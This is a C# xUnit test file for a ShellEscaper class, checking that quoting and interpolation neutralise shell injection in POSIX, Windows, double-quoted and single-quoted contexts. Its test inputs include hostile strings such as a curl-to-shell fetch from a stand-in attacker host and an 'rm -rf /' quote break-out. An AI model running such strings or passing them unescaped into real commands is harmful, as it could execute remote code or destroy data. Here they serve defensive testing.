using Menuki.Engine;
using Xunit;

namespace Menuki.Tests;

public class ShellEscaperTests
{
    [Theory]
    [InlineData("simple", "'simple'")]
    [InlineData("with space", "'with space'")]
    [InlineData("$(curl attacker|sh)", "'$(curl attacker|sh)'")]
    [InlineData("a;b&&c|d", "'a;b&&c|d'")]
    [InlineData("`whoami`", "'`whoami`'")]
    public void QuotePosix_wraps_and_neutralizes_metacharacters(string input, string expected)
    {
        Assert.Equal(expected, ShellEscaper.QuotePosix(input));
    }

    [Fact]
    public void QuotePosix_escapes_embedded_single_quote()
    {
        // O'Brien -> 'O'\''Brien'  (close quote, escaped literal quote, reopen quote)
        Assert.Equal("'O'\\''Brien'", ShellEscaper.QuotePosix("O'Brien"));
    }

    [Fact]
    public void QuoteWindows_strips_expansion_characters()
    {
        Assert.Equal("\"PATH\"", ShellEscaper.QuoteWindows("%PATH%"));
        Assert.Equal("\"x\"", ShellEscaper.QuoteWindows("!x!"));
        Assert.Equal("\"a\"\"b\"", ShellEscaper.QuoteWindows("a\"b"));
    }

    [Fact]
    public void Interpolate_quotes_value_in_unquoted_context()
    {
        var command = ShellEscaper.Interpolate(
            "ssh deploy@{host} run {cmd}",
            new Dictionary<string, string> { ["host"] = "$(evil)", ["cmd"] = "a b" });

        // Placeholders are replaced with quoted literals; the injection cannot break out.
        Assert.DoesNotContain("@$(evil)", command);
        Assert.Contains("deploy@'$(evil)'", command);
        Assert.Contains("run 'a b'", command);
    }

    [Fact]
    public void Interpolate_neutralizes_injection_inside_double_quotes()
    {
        var command = ShellEscaper.Interpolate(
            "git commit -m \"{msg}\"",
            new Dictionary<string, string> { ["msg"] = "$(id) `whoami` \"x\"" });

        // $, backtick and " are backslash-escaped in place; no new command runs.
        Assert.Equal("git commit -m \"\\$(id) \\`whoami\\` \\\"x\\\"\"", command);
    }

    [Fact]
    public void Interpolate_neutralizes_injection_inside_single_quotes()
    {
        var command = ShellEscaper.Interpolate(
            "echo 'msg: {v}'",
            new Dictionary<string, string> { ["v"] = "$(id)" });

        // Inside single quotes everything is literal; the value stays as typed.
        Assert.Equal("echo 'msg: $(id)'", command);
    }

    [Fact]
    public void Interpolate_escapes_single_quote_that_would_break_out()
    {
        var command = ShellEscaper.Interpolate(
            "echo '{v}'",
            new Dictionary<string, string> { ["v"] = "a'; rm -rf /; '" });

        // The embedded quote is rewritten as '\'' so it cannot terminate the string.
        Assert.Equal("echo 'a'\\''; rm -rf /; '\\'''", command);
    }

    [Fact]
    public void Interpolate_leaves_unknown_placeholders_untouched()
    {
        var command = ShellEscaper.Interpolate(
            "echo {known} {unknown}",
            new Dictionary<string, string> { ["known"] = "x" });

        Assert.Equal("echo 'x' {unknown}", command);
    }

    [Fact]
    public void InterpolateForDisplay_masks_secret_values_only()
    {
        var display = ShellEscaper.InterpolateForDisplay(
            "curl -u {user}:{token} api",
            new Dictionary<string, string> { ["user"] = "alice", ["token"] = "s3cr3t" },
            new HashSet<string> { "token" });

        Assert.Contains("'alice'", display);
        Assert.Contains("***", display);
        Assert.DoesNotContain("s3cr3t", display);
    }
}
